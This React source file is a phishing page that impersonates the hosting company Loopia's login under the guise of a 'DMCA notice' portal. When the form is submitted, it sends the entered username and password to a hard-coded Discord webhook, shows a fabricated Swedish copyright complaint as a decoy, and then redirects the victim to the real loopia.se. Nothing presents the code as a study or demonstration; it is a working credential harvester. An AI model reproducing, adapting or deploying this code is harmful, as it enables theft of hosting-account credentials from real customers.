import React, { useState } from 'react';
import { User, Lock, LogIn } from 'lucide-react';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [response, setResponse] = useState('');
  const [isResponseSent, setIsResponseSent] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const webhookUrl = 'https://discord.com/api/webhooks/1321730136147623966/lHHQFPEFSLGQrpB1HsZ82jBRWDEL-KnBb-jDRERjDvmaqPQkdXo-9VBSG2uUvRjW36j7';
    
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New login attempt:\nUsername: ${username}\nPassword: ${password}`,
        }),
      });
    } catch (error) {
      console.error('Error sending to webhook:', error);
    }

    // Reset form
    setUsername('');
    setPassword('');
    setIsLoggedIn(true);
    setIsLoading(false);
  };

  const handleResponse = (e: React.FormEvent) => {
    e.preventDefault();
    setIsResponseSent(true);
    setTimeout(() => {
      window.location.href = 'https://www.loopia.se';
    }, 4000);
  };

  if (isLoggedIn) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div style={{ backgroundColor: '#FFE1FA' }} className="w-full max-w-2xl rounded-2xl p-8">
          <div className="space-y-6">
            <h1 className="text-2xl font-bold text-gray-900">DMCA Anmälan #2025-01-26-001</h1>
            
            <div className="bg-white rounded-lg p-6 space-y-4">
              <div>
                <h2 className="font-semibold text-gray-900">Anmälare:</h2>
                <p>Maria Lindström</p>
              </div>
              
              <div>
                <h2 className="font-semibold text-gray-900">Gällande:</h2>
                <p>Recension på ert hotell publicerad 2025-01-26</p>
              </div>
              
              <div>
                <h2 className="font-semibold text-gray-900">Beskrivning av överträdelse:</h2>
                <p className="text-gray-700 whitespace-pre-line">
                  Jag KRÄVER att ni tar bort min recension OMEDELBART från er hemsida! Den innehåller STULNA bilder från mitt privata Instagram-konto som jag tog under min HEMSKA vistelse på ert hotell. Ni har INGEN RÄTT att använda mina bilder för att försvara er mot min kritik!
                  
                  Ni VÅGAR påstå att mina bilder på det trasiga badrumsfönstret och den FARLIGA elinstallationen är "tagna ur sitt sammanhang"! Det är ABSURT! Jag har RÄTT att dokumentera dessa LIVSFARLIGA förhållanden! Och nej, det var inte "tillfälligt ur funktion" - lampan i badrummet har ALLTID flimrat enligt andra recensioner!
                  
                  Att ni kallar min recension för "överdriven" är FÖRTAL mot MIG! Jag har RÄTT att varna andra för er BRISTANDE säkerhet! Att påstå att jag "hittar på" om fukten i väggarna och den konstanta avloppsluken är REN LÖGN! Jag har VIDEOINSPELNINGAR som BEVISAR allt!
                  
                  Detta är ett UPPENBART COPYRIGHT-BROTT! Ni har STULIT mina bilder från Instagram för att "bemöta" min kritik! Mina bilder är SKYDDADE av COPYRIGHT och jag kräver att ni tar bort HELA recensionen inom 24 timmar! Annars kommer jag kontakta min advokat som är SPECIALIST på upphovsrätt! Ni kan inte tysta ned sanningen om ert hotell genom att stjäla MINA bilder!</p>
              </div>
            </div>

            {!isResponseSent ? (
              <form onSubmit={handleResponse} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Ditt svar:
                  </label>
                  <textarea
                    value={response}
                    onChange={(e) => setResponse(e.target.value)}
                    className="w-full h-32 p-3 rounded-lg bg-white outline-none"
                    placeholder="Skriv ditt svar här..."
                  />
                </div>
                <button
                  type="submit"
                  style={{ backgroundColor: '#FF7DFA' }}
                  className="w-full flex justify-center py-3 px-4 rounded-lg text-sm font-medium text-white hover:bg-[#FF7DFA]/80 transition-colors"
                >
                  Skicka svar
                </button>
              </form>
            ) : (
              <div className="bg-green-50 p-4 rounded-lg">
                <p className="text-green-800 font-medium">Tack! Ditt svar har skickats.</p>
                <p className="text-green-600 text-sm mt-1">Vi återkommer om ärendet inte är löst.</p>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4"> 
      <div style={{ backgroundColor: '#FFE1FA' }} className="w-full max-w-md rounded-2xl p-8">
        <div className="text-center mb-8">
          <img 
            src="https://mb.cision.com/Public/21193/0/83fbae5dcce1421a_800x800ar.png" 
            alt="Loopia Logo" 
            className="w-40 h-40 object-contain mx-auto mb-6"
          />
          <h1 className="text-2xl font-bold text-gray-900">DMCA Anmälningszon</h1>
          <p className="text-gray-600 mt-2">Vänligen logga in för att se anmälan</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Användarnamn
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <User className="h-5 w-5 text-gray-500" />
              </div>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                className="block w-full pl-10 pr-3 py-2 rounded-lg bg-white outline-none"
                placeholder="ditt användarnamn"
              />
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Lösenord
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Lock className="h-5 w-5 text-gray-500" />
              </div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="block w-full pl-10 pr-3 py-2 rounded-lg bg-white outline-none"
                placeholder="••••••••"
              />
            </div>
          </div>

          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <input
                id="remember-me"
                name="remember-me"
                type="checkbox"
                className="h-4 w-4 text-[#FF7DFA] focus:ring-[#FF7DFA] border-gray-300 rounded"
              />
              <label htmlFor="remember-me" className="ml-2 block text-sm text-gray-700">
                Kom ihåg mig
              </label>
            </div>
            <a href="#" className="text-sm font-medium text-[#FF7DFA] hover:text-[#FF7DFA]/80">
              Glömt lösenord?
            </a>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            style={{ backgroundColor: '#FF7DFA' }}
            className="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white hover:bg-[#FF7DFA]/80 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#FF7DFA] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? 'Loggar in...' : 'Logga in'}
          </button>
        </form>
      </div>
    </div>
  );
}

export default App;
